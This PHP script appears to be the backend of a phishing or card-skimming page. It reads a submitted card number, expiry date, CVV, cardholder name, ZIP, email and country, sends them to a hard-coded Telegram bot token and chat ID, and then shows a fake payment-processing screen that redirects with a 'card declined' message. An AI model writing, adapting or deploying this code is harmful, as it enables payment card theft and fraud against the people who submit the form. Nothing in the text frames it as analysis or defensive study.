<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Collect data from the form
    $email = $_POST['email'];
    $card_number = $_POST['card_number'];
    $expiry_date = $_POST['expiry_date'];
    $cvv = $_POST['cvv'];
    $cardholder_name = $_POST['cardholder_name'];
    $zip = $_POST['zip'];
    $country = $_POST['country'];

    // Prepare data to send to Telegram bot
    $botToken = "7429680841:AAFEGny37vSAirONsHh4TYFJq4FdiUpQ4so";
    $chatId = "5064991938";
    $message = "CC: $card_number | Expiry Date: $expiry_date | CVV: $cvv\nCardholder Name: $cardholder_name\nZIP: $zip\nEmail: $email\nCountry: $country";

    // Send data to Telegram bot
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    file_get_contents($url);  // Send the request to Telegram bot

    // Simulate payment processing
    echo "<html><body>";
    echo "<h2>Processing your payment...</h2>";
    echo "<div id='loading' style='font-size: 20px; margin-top: 20px;'>Loading...</div>";
    
    // Simulate a delay (e.g., 10 seconds)
    sleep(10);

    // After delay, redirect to index.php with a message
    echo "<script>
        setTimeout(function() {
            window.location.href = 'index.php?message=Your card has been declined.';
        }, 10000);  // Redirect after 10 seconds
    </script>";
    echo "</body></html>";
}
?>